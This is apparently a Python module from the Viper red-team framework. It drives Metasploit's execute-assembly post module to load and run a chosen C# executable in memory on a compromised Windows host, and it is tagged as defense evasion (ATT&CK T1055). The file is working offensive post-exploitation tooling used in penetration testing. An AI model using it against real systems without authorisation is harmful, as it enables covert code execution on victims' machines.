# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

import base64

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "内存执行C#可执行文件"
    DESC_ZH = "模块将C#编写的exe文件加载到内存中,然后使用CLR执行.\n" \
              "需要已控主机安装.net2.0（win2008默认安装）或.net4.0（win2012默认安装）.\n" \
              "可执行文件需要与已控主机.net版本相同.\n" \
              "功能类似CobaltStrike的execute-assembly,当exe需要输入参数时确保填写参数."

    NAME_EN = "Memory execution C# executable file"
    DESC_EN = "The module loads the exe file written in C# into the memory and then executes it using CLR.\n" \
              "Need to install .net2.0 (win2008 default installation) or .net4.0 (win2012 default installation) on the target host.\n" \
              "The executable file needs to be the same as the version of the target host .net.\n" \
              "The function is similar to the execute-assembly of CobaltStrike. When exe needs to input parameters, you need to make sure to fill in the parameters."
    MODULETYPE = TAG2TYPE.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/gz333t"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    AUTHOR = ["Viper"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionFileEnum(ext=['exe']),
        OptionStr(name='ARGUMENTS',
                  tag_zh="命令行参数", desc_zh="运行exe时输入的参数",
                  tag_en="Command line parameters", desc_en="Parameters entered when running the exe",
                  length=24,
                  ),
        OptionInt(name='WAIT',
                  tag_zh="等待时间(秒)", desc_zh="读取输出前等待时间",
                  tag_en="waiting time(seconds)", desc_en="Wait time before reading output",
                  default=10),
        OptionBool(name='KILL',
                   tag_zh="结束进程", desc_zh="执行完成后结束C#进程",
                   tag_en="Kill process", desc_en="Kill the C# process after the execution is complete",
                   default=True),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/manage/execute_assembly_api"

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if not session.is_windows:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        exe_file = self.get_fileoption_filename()
        if exe_file is None:
            return False, "请选择exe文件,文件后缀必须为exe", "Please choose to exe file, the file suffix must be exe"
        else:
            self.set_msf_option(key='ASSEMBLY', value=exe_file)

        arguments = self.param("ARGUMENTS")
        self.set_msf_option(key='ARGUMENTS', value=arguments)

        wait = self.param("WAIT")
        self.set_msf_option(key='WAIT', value=wait)
        kill = self.param("KILL")
        self.set_msf_option(key='KILL', value=kill)
        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
        else:
            assembly_out = base64.b64decode(data).decode('utf-8', errors="ignore")
            if assembly_out is None or len(assembly_out) == 0:
                self.log_warning("exe文件未输出信息", "exe file does not output information")
                if self.param("ARGUMENTS") is None or len(self.param("ARGUMENTS")) == 0:
                    self.log_warning("如果exe程序接受参数输入，请尝试输入参数",
                                     "If the exe program accepts parameter input, please try to enter the parameter")
            else:
                self.log_good("exe执行完成,输出信息:", "exe execution is complete, output:")
                try:
                    self.log_raw(base64.b64decode(data).decode('utf-8', errors="ignore"))
                except Exception as E:
                    print(E)
                    self.log_raw(data)
